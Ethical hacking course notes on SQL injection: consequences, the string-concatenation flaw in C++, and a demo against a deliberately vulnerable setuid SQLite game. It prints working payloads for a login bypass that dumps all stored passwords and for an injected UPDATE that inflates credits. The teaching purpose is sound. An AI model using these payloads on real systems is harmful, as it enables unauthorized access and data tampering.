# SQL Injection Attack

- Details - [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- attack consists of insertion or "injection" of a SQL query via the input data from the client to the application
- a successful attack violates all three principles of CIA (Confidentialiy, Integrity and Availablity) and more

## Consequences
- the main consequences are:

### Confidentiality
- exploit can read unauthorized sensitive data violating confidentiality of the data
    
### Integrity
- exploit can alter unauthrized sensitive data violating integrity of the data

### Availability
- exploit can delete data by dropping table or the whole database viloating availability of the data

### Authentication
- exploit allows an attacker to authenticate to a vulnerable application as someone else without the knowledge of password

### Authorization
- if access control and authrizaton information is held on the SQL database, it can be modified as well e.g., allowing a regular user all the priviledges of an administrative user

## Risk Factors
- the platform affected ared:
    - Language: SQL - Structured query language
    - Platform: Any that interacts with a SQL database
- SQL injection has become a common issue with SQL-based web applications
- the flaw can be easily deteced and exploited as well as mitigated

## Programming Flaw
- developers simply trust the user input and concatenates the user input as part of the SQL query that's sent to the database engine
- the flaw is not specific to any programming language API used to connect to the SQL database; but affects all the languages if not done correctly!
- attack is accomplished by placing/injecting a meta character into data input thus fooling the application to execute the injected SQL and forcing the application to do things that was not intended by the developers

## Examples
- the following example demonstrates C++ language interaction with the SQL database


```c++
#include <string>
#include <iostream>

using namespace std;
```


```c++
string username, password, sql;
```


```c++
cout << "enter username: ";
cin >> username;
```

    enter username: user



```c++
cout << "enter password: ";
cin >> password;
```

    enter password: user



```c++
sql = "select uid, username, password from account where username='"+username+"' and password='"+password+"'";
```


```c++
sql
```




    "select uid, username, password from account where username='user' and password='user'"



### what if the attackers provided
- username: yada' or 1=1' --
- password: who cares?


```c++
cout << "enter username: ";
getline(cin, username);
```

    enter username: yada' or 1=1; --



```c++
cout << "enter password: ";
getline(cin, password);
```

    enter password: who cares?



```c++
sql = "select uid, username, password from account where username='"+username+"' and password='"+password+"'";
```


```c++
sql
```




    "select uid, username, password from account where username='yada' or 1=1; --' and password='who cares?'"



## SQL Injection Demos
- see demos/SQL/injection folder
- injection project is the redesign of lucky7 game using SQLite database
- use `Makefile` to compile the game
- game must be root setuid as it creates and stores `lucky7.db` file in `var` folder
- when the game is executed it sets up the database with default account `admin:P@$sw0rd!`
- players can register and play luck7 games

```bash
┌──(kali㉿K)-[~/EthicalHacking]
└─$ cd demos/SQL/injection 

┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]
└─$ sudo make  

┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]
└─$ sudo chmod +s lucky7.exe

┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]
└─$ ls -al lucky7.exe       
-rwsr-sr-x 1 root root 391664 Dec 27 14:11 lucky7.exe


```

- run the game and follow the menu option

```bash
┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]
└─$ ./lucky7.exe
Database opened successfully...
SQL: CREATE TABLE IF NOT EXISTS Account ( uid TEXT, username TEXT, password TEXT, role TEXT, UNIQUE (username), PRIMARY KEY (uid));
SQL: CREATE TABLE IF NOT EXISTS Player (uid TEXT, credits INTEGER, name TEXT, PRIMARY KEY (uid) );
SQL: INSERT INTO Account (uid, username, password, role) VALUES ('fbb16eb2-eff2-49a9-b063-2d06a462c5b3', 'admin', 'P@$sw0rd!', 'admin');
SQL error: UNIQUE constraint failed: Account.username...
Database setup complete...
========================================
-=[ Main Menu Options ]=-
1 - Login 
2 - Register New Player
3 - Exit

Enter your choice [1-3]: 2
-=-={ New Player Registration }=-=-
Username: user
Password: user
Full name: user user
SQL: INSERT INTO Account (uid, username, password, role) VALUES ( '41122bf6-2231-4338-ac94-15d5eb8fc591', 'user', 'user', 'user');
SQL: INSERT INTO Player (uid, credits, name) VALUES ('41122bf6-2231-4338-ac94-15d5eb8fc591', '500', 'user user');
Registration successful!
Login to start playing...
========================================
-=[ Main Menu Options ]=-
1 - Login 
2 - Register New Player
3 - Exit
Enter your choice [1-3]: 
```
- login and play game

```bash
Enter your choice [1-3]: 1
Username: user
Password: user
SQL: SELECT uid, password, role from Account WHERE username = 'user' and password = 'user';
SQL: SELECT credits, name from Player WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';
=================================================
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Logout
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Name: user user]
[You have 500 credits]
=================================================
Enter your choice [1-7]: 1

~*~*~ Lucky 7 ~*~*~
Costs 10 credits to play this game.
Machine will generate 1 random numbers each between 1 and 9.
If the number is 7, you win a jackpot of 10 THOUSAND
Otherwise, you lose.


[DEBUG] current_game pointer 0x00404d23
the random number is: 2 
Sorry! Better luck next time...

You have 490 credits
Would you like to play again? [y/n]: n
SQL: UPDATE Player set name = 'user user', credits = 490 WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';
=================================================
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change name
6 - Reset account at 500 credits
7 - Logout
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Name: user user]
[You have 490 credits]
=================================================
Enter your choice [1-7]: 7
SQL: UPDATE Player set name = 'user user', credits = 490 WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';
========================================
-=[ Main Menu Options ]=-
1 - Login 
2 - Register New Player
3 - Exit
Enter your choice [1-3]: 
```

- Login as built-in admin account

```bash
Enter your choice [1-3]: 1
Username: admin
Password: P@$sw0rd!
SQL: SELECT uid, password, role from Account WHERE username = 'admin' and password = 'P@$sw0rd!';
SQL: SELECT credits, name from Player WHERE uid = '38db4ccb-eb09-4296-93d2-be49d10e9c8d';

            ~*~*~*~* User Account Details ~*~*~*
Username            Password            Role      Full name           Credits   
--------------------------------------------------------------------------------
admin               P@$sw0rd!           admin     Admin Admin         0         
jsmith              password            user      John Smith          400       
user                user                user      user user           490       
********************************************************************************
========================================
-=[ Main Menu Options ]=-
1 - Login 
2 - Register New Player
3 - Exit
Enter your choice [1-3]: 
```

### SQL Injection
- login as admin without providing password

```bash
Enter your choice [1-3]: 1
Username: yada' or 1=1;--
Password: asdf
SQL: SELECT uid, password, role from Account WHERE username = 'yada' or 1=1;--' and password = 'asdf';
SQL: SELECT credits, name from Player WHERE uid = '38db4ccb-eb09-4296-93d2-be49d10e9c8d';

            ~*~*~*~* User Account Details ~*~*~*
Username            Password            Role      Full name           Credits   
--------------------------------------------------------------------------------
admin               P@$sw0rd!           admin     Admin Admin         0         
jsmith              password            user      John Smith          400       
user                user                user      user user           490       
********************************************************************************
========================================
-=[ Main Menu Options ]=-
1 - Login 
2 - Register New Player
3 - Exit
Enter your choice [1-3]: 
```

### Hit Jackput - increase your credits by 1M

```
Enter your choice [1-7]: 5

Change user name
Enter your new name:
User User', credits=credits+1000000 where uid='41122bf6-2231-4338-ac94-15d5eb8fc591'; --
SQL: UPDATE Player set name = 'User User', credits=credits+1000000 where uid='41122bf6-2231-4338-ac94-15d5eb8fc591'; --' WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';
==================================================
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change name
6 - Reset account at 500 credits
7 - Logout
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Name: User User'; update Player set credits=credits+1000000 where uid='41122bf6-2231-4338-ac94-15d5eb8fc591'; --]
[You have 200490 credits]
==================================================
Enter your choice [1-7]: 
```

- View your total credits with option 4
- Or logout and log back in to see the new credits


```c++

```
